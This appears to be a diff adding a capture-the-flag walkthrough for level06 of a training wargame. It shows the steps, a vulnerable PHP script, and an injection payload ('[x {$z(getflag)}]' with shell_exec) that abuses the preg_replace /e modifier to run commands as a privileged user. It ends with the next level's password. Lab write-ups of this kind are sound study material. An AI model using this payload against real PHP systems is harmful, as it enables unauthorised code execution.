@@ -1,0 +1,25 @@
+1. ls -la =>
+-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
+-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
+
+2. in other terminal: scp -P 4243 level06@localhost:/home/user/level06/level06 .
+
+3. https://dogbolt.org => analyse binary in C output
+
+4. cat level06.php => 
+#!/usr/bin/php
+<?php
+function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+$r = x($argv[1], $argv[2]); print $r;
+?>
+
+5. echo '[x {$z(getflag)}]' > /var/crash/getflag
+- preg_replace(/e) contains a vulnerability that allows code execution
+- first you must make sure that bash doesn't expand $ variable, so instead of /" you use /' when creating your script
+- the proper syntax to do that requires to expand a variable passed as the second parameter
+- you give shell_exec as second parameter, and {$z(getflag)} as its argument
+
+6. ./level06 /var/crash/getflag shell_exec
+
+level07: wiok45aaoguiboiki2tuin6ub
